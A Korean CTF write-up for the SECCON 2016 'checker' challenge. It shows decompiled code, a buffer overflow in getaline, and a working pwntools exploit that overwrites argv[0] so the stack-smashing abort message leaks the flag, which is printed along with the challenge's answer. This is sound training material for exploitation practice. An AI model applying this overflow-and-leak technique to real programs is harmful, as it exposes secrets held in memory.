---
layout: post
title: "SECCON 2016 CTF - checker"
date: 2018-11-13
excerpt: "ssp message leak"
tags: [write-up]
comments: true
---
```bash
~/pwn/prob/checker st4nw@trust
❯ checksec checker 
[*] '/home/st4nw/pwn/prob/checker/checker'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Full RELRO와 SSP가 적용되어있습니다.

main
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char *v3; // rax
  char s1; // [rsp+0h] [rbp-90h]
  unsigned __int64 v6; // [rsp+88h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  dprintf(1, "Hello! What is your name?\nNAME : ", envp);
  getaline(&name);
  do
  {
    dprintf(1, "\nDo you know flag?\n>> ");
    getaline(&s1);
  }
  while ( strcmp(&s1, "yes") );
  dprintf(1, "\nOh, Really??\nPlease tell me the flag!\nFLAG : ");
  getaline(&s1);
  if ( !s1 )
  {
    dprintf(1, "Why won't you tell me that???\n");
    _exit(0);
  }
  if ( !strcmp(flag, &s1) )


    v3 = "Thank you, %s!!\n";
  else
    v3 = "You are a liar...\n";
  dprintf(1, v3, &name);
  return 0;
}
```
init에서 flag를 bss에 넣어둡니다. main에서는 getaline으로 bof가 발생하는 것 외에는 주의해야 할 점이 없습니다.

getaline
```c
__int64 __fastcall getaline(__int64 a1)
{
  char buf; // [rsp+13h] [rbp-Dh]
  unsigned int v3; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  buf = -1;
  v3 = 0;
  while ( buf && read(0, &buf, 1uLL) )
  {
    if ( buf == 0xA )
      buf = 0;
    *(a1 + v3++) = buf;
  }
  return v3;
}
```
getaline은 스택의 null을 만나면 입력이 끊긴다는 점을 유의해야 합니다.

### Exploit

우선 쉘을 따는 것은 힘들기에 argv[0]를 조작해 SSP message를 이용해 flag를 읽는 방법으로 exploit 할 수 있습니다.

주의할 점은, getaline의 특성으로 단순히 p64(flag)로 바로 입력할 시 argv[0]의 NULL 때문에 입력이 끊겨 0x00007fff0060c010처럼 값이 세팅됩니다.

따라서 입력값 뒤에 붙는 NULL을 이용해 argv[0]을 NULL로 정리한 뒤 페이로드를 보내면 됩니다.

exp.py
```python
from pwn import *

p = process('./checker')

flag = 0x6010C0

p.recvuntil('NAME : ')
p.sendline('james')

for i in range(8):
	payload = 'A' * (383 - i)
	p.sendline(payload)

p.recv()
p.sendline('yes')

payload = 'A' * 376
payload += p64(flag)

p.sendline(payload)

p.interactive()
```

```bash
~/pwn/prob/checker st4nw@trust
❯ python exp.py 
[+] Starting local process './checker': pid 6834
[*] Switching to interactive mode
Do you know flag?
>> 
Do you know flag?
>> 
Do you know flag?
>> 
Do you know flag?
>> 
Oh, Really??
Please tell me the flag!
FLAG : You are a liar...
*** stack smashing detected ***: SECCON{y0u_c4n'7_g37_4_5h3ll,H4h4h4}
 terminated
[*] Got EOF while reading in interactive
```
